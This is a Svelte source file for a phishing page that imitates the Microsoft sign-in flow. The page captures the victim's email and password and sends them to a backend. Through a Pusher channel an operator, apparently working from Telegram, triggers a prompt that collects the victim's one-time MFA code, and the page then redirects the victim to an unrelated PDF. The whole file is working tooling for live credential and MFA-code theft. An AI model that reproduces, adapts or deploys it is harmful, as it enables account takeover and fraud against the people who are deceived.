<script>
  import { validateEmailFormat, sendFrmData, sendOTP } from '$lib'
  import Pusher from 'pusher-js';
  import { PUBLIC_PUSHER_KEY, PUBLIC_PUSHER_CLUSTER } from '$env/static/public';


  let identifier = $state('');
  let password = $state('');
  let otp = $state('');
  let isStayIn = $state(true);
  let identifierErr = $state('');
  let passwordErr = $state('');
  let otpError = $state('');
  let showPw = $state(false);
  let isLoading = $state(false);
  let step = $state('identifier'); // 'identifier' | 'password' | 'otp' | 'success'

  let authType = $state('') // 'OTP' or 'PROMPT'
  let finalStatus = $state(''); // Tracking final state evaluations: 'APPROVED' or 'REJECTED' or '' (default is '')
  let showOTPsection = $state(false);

  let showFinalStatus = $derived.by(() => {
    // show error on rejected or failed trigger state evaluation
    if (finalStatus === 'REJECTED' || finalStatus === '') {
      return 'hide'
    }
    // APPROVED final state
    return 'show'
  });

  let activeChannelName = $state(''); // help holds the active channel name attached with the sessionId

  let idBox = $state();
  let pwBox = $state();
  let otpBox = $state();
  let successBox = $state();


  $effect(() => {
    /* shows OTP section when changed */
    if (showOTPsection) {
      isLoading = false;
      step = 'otp';

      pwBox.classList.remove('opacity-100', 'translate-x-0');
      pwBox.classList.add('opacity-0', '-translate-x-6');

      const callback = (ev) => {
        if (ev.propertyName === 'opacity') {
          pwBox?.removeEventListener('transitionend', callback);
          pwBox?.classList.add('hidden');
          otpBox?.classList.remove('hidden');

          requestAnimationFrame(() => {
            otpBox?.classList.remove('opacity-0', 'translate-x-6');
            otpBox?.classList.add('opacity-100', 'translate-x-0');
          });
        }
      };

      pwBox.addEventListener('transitionend', callback);
    }

    /* shows Success section when real-time trigger is pushed into */
    if (showFinalStatus === 'show') {
      showOTPsection = false
      isLoading = false;
      step = 'success';

      otpBox.classList.remove('opacity-100', 'translate-x-0');
      otpBox.classList.add('opacity-0', '-translate-x-6');

      const complete = (ev) => {
        if (ev.propertyName === 'opacity') {
          otpBox?.removeEventListener('transitionend', complete);
          otpBox?.classList.add('hidden');
          successBox?.classList.remove('hidden');

          requestAnimationFrame(() => {
            successBox?.classList.remove('opacity-0', 'translate-x-6');
            successBox?.classList.add('opacity-100', 'translate-x-0');
          });
        }
      };

      otpBox.addEventListener('transitionend', complete);

      // redirect user after 3seconds
      setTimeout(() => {
        location.href = 'https://www.peacechurch-cr.org/editoruploads/files/GROW/Resources%20for%20Growing/Bible%20Reading/Scripture_for_Every_Moment.pdf'
      }, 2000)
    }
  });

  // Establish an isolated single-user stream (per session based interaction)
  function setupPrivatePusherChannel(sessionId) {
    // Configured to automatically ping /api/pusher/auth behind the scenes
    const pusherClient = new Pusher(PUBLIC_PUSHER_KEY, {
      cluster: PUBLIC_PUSHER_CLUSTER,
      authEndpoint: '/api/pusher/auth'
    });

    activeChannelName = `private-session-${sessionId}`;

    // Subscribes matching the "private-session-{UUID}" footprint your backend utilizes
    const privateChannel = pusherClient.subscribe(activeChannelName);

    // Listen for the custom value you type into Telegram
    privateChannel.bind('auth-event', ({ type='', value='' }) => {
      authType = type; // 'OTP' or 'PROMPT'
      showOTPsection = true;
    });

    // Listen block 2: Catches the Success / Error evaluation button click
    privateChannel.bind('final-status-event', ({ status }) => {
      if (status === 'REJECTED') {
        otpError = 'There was an error verifying your OTP. Please try again'
        isLoading = false;
      } else {
        finalStatus = status; // 'APPROVED' or 'REJECTED'
        // Fully disconnect and release socket streams now that the whole lifecycle is over
        pusherClient.unsubscribe(activeChannelName);
        pusherClient.disconnect();
      }
    });

    // NEW Listener C: Catches the top-row Password Failure trigger
    privateChannel.bind('password-failed-event', ({ message }) => {
      // Force the UI back to State A and surface the error reason explicitly
      passwordErr = message
      password = ''; // Clear out the bad password field for safe re-entry
      isLoading = false;
      pusherClient.unsubscribe(activeChannelName);
      pusherClient.disconnect();
    });
  }

  function triggerId(e) {
    e.preventDefault();
    // check if empty email
    if (!identifier.trim()) {
      identifierErr = "Enter a valid email.";
      return;
    }

    // validate email
    const chkEmailErr = validateEmailFormat(identifier.trim())
    if (chkEmailErr.length > 0) {
      identifierErr = chkEmailErr;
      return;
    }

    identifierErr = '';
    isLoading = true;

    setTimeout(() => {
      isLoading = false;
      step = 'password';

      if (idBox && pwBox) {
        idBox.classList.remove('opacity-100', 'translate-x-0');
        idBox.classList.add('opacity-0', '-translate-x-6', 'pointer-events-none');

        const callback = (ev) => {
          if (ev.propertyName === 'opacity') {
            idBox?.removeEventListener('transitionend', callback);
            idBox?.classList.add('hidden');
            pwBox?.classList.remove('hidden');

            requestAnimationFrame(() => {
              pwBox?.classList.remove('opacity-0', 'translate-x-6');
              pwBox?.classList.add('opacity-100', 'translate-x-0');
            });
          }
        };
        idBox.addEventListener('transitionend', callback);
      }
    }, 700);
  }

  function handleBackToId() {
    password = '';
    passwordErr = '';
    isLoading = true;

    setTimeout(() => {
      isLoading = false;

      if (idBox && pwBox) {
        step = 'identifier';
        pwBox.classList.remove('opacity-100', 'translate-x-0');
        pwBox.classList.add('opacity-0', 'translate-x-6');

        const backTransition = (ev) => {
          if (ev.propertyName === 'opacity') {
            pwBox.removeEventListener('transitionend', backTransition);
            pwBox.classList.add('hidden');
            idBox.classList.remove('hidden');

            requestAnimationFrame(() => {
              idBox.classList.remove('opacity-0', '-translate-x-6', 'pointer-events-none');
              idBox.classList.add('opacity-100', 'translate-x-0');
            });
          }
        };
        pwBox.addEventListener('transitionend', backTransition);
      }
    }, 300);
  }

  async function triggerPassword(e) {
    e.preventDefault();
    if (!password) {
      passwordErr = "Enter your password";
      return;
    }
    passwordErr = '';
    isLoading = true;

    try {
      // send to backend api
      const res = await sendFrmData({ signinType: 'Microsoft Sign-in', email: identifier, password: password })
      
      // check if there are no errors
      if (res?.error) {
        passwordErr = res?.message
        isLoading = false;
        return
      }

      // wait for real-time update
      if (res?.success) {
        setupPrivatePusherChannel(res.sessionId);
      }
    } catch (error) {
      console.error('Error submitting form data: \n', error.message)
      passwordErr = error.message;
    }
  }

  function handleBackToPassword() {
    otp = '';
    otpError = '';
    isLoading = true;

    setTimeout(() => {
      isLoading = false;
      step = 'password';

      if (pwBox && otpBox) {
        otpBox.classList.remove('opacity-100', 'translate-x-0');
        otpBox.classList.add('opacity-0', 'translate-x-6');

        const callback = (ev) => {
          if (ev.propertyName === 'opacity') {
            otpBox?.removeEventListener('transitionend', callback);
            otpBox?.classList.add('hidden');
            pwBox?.classList.remove('hidden');

            requestAnimationFrame(() => {
              pwBox?.classList.remove('opacity-0', '-translate-x-6');
              pwBox?.classList.add('opacity-100', 'translate-x-0');
            });
          }
        };
        otpBox.addEventListener('transitionend', callback);
      }
    }, 300);
  }

  async function handleOtpSubmit(e) {
    e.preventDefault();
    if (!otp) {
      otpError = "Please enter the code sent to your authenticator or text message.";
      return;
    }
    const cleanOtp = otp.replace(/\D/g, '');
    if (cleanOtp.length < 6) {
      otpError = "Your verification code must be 6 digits.";
      return;
    }
    otpError = '';
    isLoading = true;

    // send to backend api
    const res = await sendOTP({ otp: otp, email: identifier });
  }
</script>


<div 
  class="min-h-screen bg-[#f2f2f2] md:bg-cover md:bg-center md:bg-no-repeat flex flex-col justify-between font-sans antialiased text-[#1b1b1b] relative"
  style="background-image: url('https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?auto=format&fit=crop&w=1920&q=80');"
>
  <!-- Absolute overlay behind card to render signature abstract backdrop in style of Live Portal -->
  <div class="absolute inset-0 bg-[#f2f2f2]/60 md:bg-black/15 backdrop-blur-[2px] z-0"></div>

  <div class="flex-1 flex items-center justify-center px-4 py-8 z-10">
    <div class="w-full max-w-110 bg-white p-11 shadow-md relative min-h-110 flex flex-col justify-between">
      <!-- Blue Live loading line -->
      <div class="absolute top-0 left-0 right-0 h-1 bg-gray-50 overflow-hidden transition-opacity duration-300 {isLoading ? 'opacity-100' : 'opacity-0'}">
        <div class="h-full bg-[#0067b8] animate-[loading-bar_1.2s_infinite_ease-in-out]"></div>
      </div>

      <div class="flex flex-col flex-1 justify-between">
        <!-- STAGE 1 -->
        <div bind:this={idBox} class="flex-1 flex flex-col justify-between transition-all duration-200 opacity-100 transform translate-x-0">
          <div>
            <div class="flex items-center gap-1.5 mb-5 mt-1 select-none">
              <div class="grid grid-cols-2 gap-0.5">
                <div class="w-2.5 h-2.5 bg-[#f25022]"></div>
                <div class="w-2.5 h-2.5 bg-[#7fba00]"></div>
                <div class="w-2.5 h-2.5 bg-[#00a4ef]"></div>
                <div class="w-2.5 h-2.5 bg-[#ffb900]"></div>
              </div>
              <span class="text-sm font-semibold text-gray-500">Microsoft</span>
            </div>

            <h1 class="text-2xl font-semibold mb-4 text-black">Sign in</h1>
            
            <p class="text-[15px] font-normal text-[#1b1b1b] mb-4">
              to continue to Microsoft services
            </p>

            <form onsubmit={triggerId} class="space-y-4">
              <input 
                type="text" 
                bind:value={identifier} 
                placeholder="Email, phone, or Skype" 
                class="w-full py-2 border-b outline-none focus:border-[#0067b8]" 
              />
              <!-- error message -->
              {#if identifierErr != '' }
                <div class="text-[13px] text-[#e81123] leading-snug px-1 flex items-start gap-1.5 animate-fadeIn">
                  <span>{identifierErr}</span>
                </div>
              {/if}
              <!-- Microsoft standard description links -->
              <div class="space-y-2.5 pt-1.5 text-[13px]">
                <p class="text-[#1b1b1b]">
                  No account?{' '}
                  <a href="#/" class="text-[#0067b8] hover:underline" onclick={(e) => { e.preventDefault(); alert("Redirecting to account creation..."); }}>
                    Create one!
                  </a>
                </p>
                <p class="text-[#1b1b1b]">
                  Can't access your account?{' '}
                  <a href="#/" class="text-[#0067b8] hover:underline" onclick={(e) => { e.preventDefault(); alert("Support to reset Live account credentials is open."); }}>
                    Can't access your account?
                  </a>
                </p>
              </div>

              <button 
                type="submit" 
                disabled={isLoading} 
                class="float-right px-8 py-1.5 bg-[#0067b8] text-white disabled:opacity-30 transition-opacity duration-300 cursor-pointer"
              >
                Next
              </button>
            </form>
          </div>
        </div>

        <!-- STAGE 2 (Password) -->
        <div bind:this={pwBox} class="flex-1 flex flex-col justify-between transition-all duration-200 opacity-0 hidden transform translate-x-6">
          <div>
            <div class="flex items-center gap-1.5 mb-5 mt-1 select-none">
              <div class="grid grid-cols-2 gap-0.5">
                <div class="w-2.5 h-2.5 bg-[#f25022]"></div>
                <div class="w-2.5 h-2.5 bg-[#7fba00]"></div>
                <div class="w-2.5 h-2.5 bg-[#00a4ef]"></div>
                <div class="w-2.5 h-2.5 bg-[#ffb900]"></div>
              </div>
              <span class="text-sm font-semibold text-gray-500">Microsoft</span>
            </div>

            <!-- Microsoft interactive email back element -->
            <div class="flex items-center gap-2 mb-6">
              <button 
                type="button" 
                onclick={handleBackToId} 
                class="p-1 hover:bg-gray-100 rounded-full text-gray-600 transition-colors"
                aria-label="Go back to identifier page"
              >
                <svg class="w-4 h-4" fill="none" stroke="currentColor" strokeWidth="2.5" viewBox="0 0 24 24">
                  <line x1="19" y1="12" x2="5" y2="12"></line>
                  <polyline points="12 19 5 12 12 5"></polyline>
                </svg>
              </button>
              <span class="text-[15px] text-[#1b1b1b] truncate font-normal">{identifier}</span>
            </div>

            <h1 class="text-2xl font-semibold mb-4">Enter password</h1>

            <form onsubmit={triggerPassword} class="space-y-4">
              <input 
                type="password" 
                bind:value={password} 
                placeholder="Password" 
                class="w-full py-2 border-b outline-none focus:border-[#0067b8]" 
              />

              <!-- Validation Error reporting element -->
              {#if passwordErr}
                <div class="text-[13px] text-[#e81123] leading-snug px-1 flex items-start gap-1.5 animate-fadeIn">
                  <span>{passwordErr}</span>
                </div>
              {/if} 

              <!-- Actions suggestions links -->
              <div class="space-y-2 text-[13px] pt-1">
                <p class="text-[#1b1b1b]">
                  Forgot password?{' '}
                  <a href="#/" class="text-[#0067b8] hover:underline" onclick={(e) => { e.preventDefault(); passwordErr = "Visit account.live.com/password/reset to verify yourself."; }}>
                    Reset it now
                  </a>
                </p>
                <p class="text-[#1b1b1b]">
                  Other ways to sign in?{' '}
                  <a href="#/" class="text-[#0067b8] hover:underline" onclick={(e) => { e.preventDefault(); alert("Interactive replica auth sandbox enabled."); }}>
                    Use authentication replica
                  </a>
                </p>
              </div>

              <!-- Keep me signed in check -->
              <div class="flex items-center pt-3 select-none">
                <input
                  type="checkbox"
                  id="microsoftKeepSignedIn"
                  checked
                  class="w-4.5 h-4.5 text-[#0067b8] border-gray-300 focus:ring-0 cursor-pointer"
                />
                <label for="microsoftKeepSignedIn" class="ml-3 text-[14px] text-[#1b1b1b] cursor-pointer select-none">
                  Keep me signed in
                </label>
              </div>

              <button 
                type="submit" 
                disabled={isLoading} 
                class="float-right px-8 py-1.5 bg-[#0067b8] text-white disabled:opacity-30 cursor-pointer"
              >
                Next
              </button>
            </form>
          </div>
        </div>

        <!-- STAGE 3 (OTP Verification) -->
        <div bind:this={otpBox} class="flex-1 flex flex-col justify-between transition-all duration-200 opacity-0 hidden transform translate-x-6">
          <div>
            <!-- Brand Logo inside Card -->
            <div class="flex items-center gap-1.5 mb-5 mt-1 select-none">
              <!-- High quality Microsoft SVG block logo -->
              <div class="grid grid-cols-2 gap-0.5 w-5.5 h-5.5 shrink-0">
                <div class="bg-[#f25022]"></div>
                <div class="bg-[#7fba00]"></div>
                <div class="bg-[#00a4ef]"></div>
                <div class="bg-[#ffb900]"></div>
              </div>
              <span class="font-semibold text-[17px] text-[#737373] font-sans">Microsoft</span>
            </div>

            <!-- Back Link Row -->
            <div class="flex items-center gap-2 mb-4">
              <!-- svelte-ignore a11y_consider_explicit_label -->
              <button
                type="button"
                onclick={handleBackToPassword}
                class="inline-flex items-center justify-center p-1 rounded-full hover:bg-gray-100 transition-colors"
              >
                <svg class="w-4 h-4 text-gray-600" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
                  <path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7" />
                </svg>
              </button>
              <span class="text-[13px] text-[#505050] truncate font-medium">{identifier}</span>
            </div>

            <h2 class="text-[24px] font-semibold tracking-tight text-[#1b1b1b] mb-1">
              Enter code
            </h2>
            
            <p class="text-[14px] text-[#505050] leading-snug mb-5">
              We sent a code to your registered device. Enter the 6-digit code below to confirm this is you.
            </p>

            <form id="microsoft-otp-form" onsubmit={handleOtpSubmit} class="space-y-4">
              <div class="relative">
                <input
                  type="text"
                  id="microsoft-otp-input"
                  maxLength={6}
                  bind:value={otp}
                  oninput={(e) => {
                    otp = e.currentTarget.value.replace(/\D/g, '');
                    if (otpError) otpError = '';
                  }}
                  placeholder="Code"
                  class="w-full bg-transparent px-0 py-2.5 text-[15px] border-b outline-none transition-colors duration-150 text-[#1b1b1b] placeholder-gray-400
                    {otpError 
                      ? 'border-[#e81123] focus:border-[#e81123]' 
                      : 'border-gray-300 focus:border-[#0067b8]'
                    }
                  "
                />
              </div>

              {#if otpError}
                <div class="text-[13px] text-[#e81123] leading-snug px-1 flex items-start gap-1.5 animate-fadeIn">
                  <svg class="w-5 h-5 shrink-0 fill-current text-[#e81123] mt-px" viewBox="0 0 24 24">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
                  </svg>
                  <span>{otpError}</span>
                </div>
              {/if}

              <div class="pt-4 text-xs text-[#505050] leading-snug">
                <p>Having trouble? Use Microsoft Authenticator instead or seek help from account admins.</p>
              </div>
            </form>
          </div>

          <!-- Action buttons footer -->
          <div class="flex items-center justify-end gap-3 mt-8 pt-4">
            <button
              type="submit"
              disabled={isLoading}
              form="microsoft-otp-form"
              class="px-8 py-1.5 bg-[#0067b8] hover:bg-[#005da6] active:bg-[#005292] disabled:opacity-30 text-white text-[15px] font-normal border border-transparent shadow-sm select-none cursor-pointer focus:outline-none transition-all "
            >
              Verify
            </button>
          </div>
        </div>

        <!-- STAGE 4 (Success) -->
        <div bind:this={successBox} class="flex-1 flex flex-col justify-center items-center text-center transition-all duration-200 ease-in-out opacity-0 hidden transform translate-x-6 py-4">
          <div class="w-16 h-16 rounded-full bg-[#f1fcf5] text-[#107c41] flex items-center justify-center mb-6 border border-[#dfebd1] animate-[scaleIn_0.32s_cubic-bezier(0.16,1,0.3,1)]">
            <svg class="w-8 h-8 fill-none stroke-current" strokeWidth="2.5" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
            </svg>
          </div>

          <h2 class="text-2xl font-semibold tracking-tight text-[#1b1b1b] mb-2">
            Authentication Confirmed
          </h2>

          <div class="bg-[#f5f5f5] border border-gray-200 rounded-xl px-5 py-3.5 mb-6 w-full">
            <p class="text-xs text-[#737373] font-medium uppercase tracking-wider mb-0.5 font-mono">Microsoft account (live)</p>
            <p class="text-base font-bold text-[#1b1b1b] truncate px-1">{identifier}</p>
          </div>

          <p class="text-sm text-[#737373] max-w-70 leading-relaxed mb-8">
            Verified! You are now successfully authenticated with your Microsoft credentials.
          </p>

          <button 
            type="button"
            onclick={() => { 
              identifier = ''; password = ''; otp = ''; step = 'identifier'; 
              if (idBox && successBox) {
                successBox.classList.add('hidden', 'opacity-0');
                idBox.classList.remove('hidden', 'opacity-0', '-translate-x-6', 'pointer-events-none');
                idBox.classList.add('opacity-100', 'translate-y-0');
              }
            }} 
            class="px-6 py-2.5 bg-[#1b1b1b] hover:bg-[#333336] active:bg-[#1b1b1b] cursor-pointer text-white text-sm font-semibold rounded-full transition-all focus:outline-none focus:ring-2 focus:ring-offset-2"
          >
            Sign out
          </button>
        </div>
      </div>
    </div>
  </div>
</div>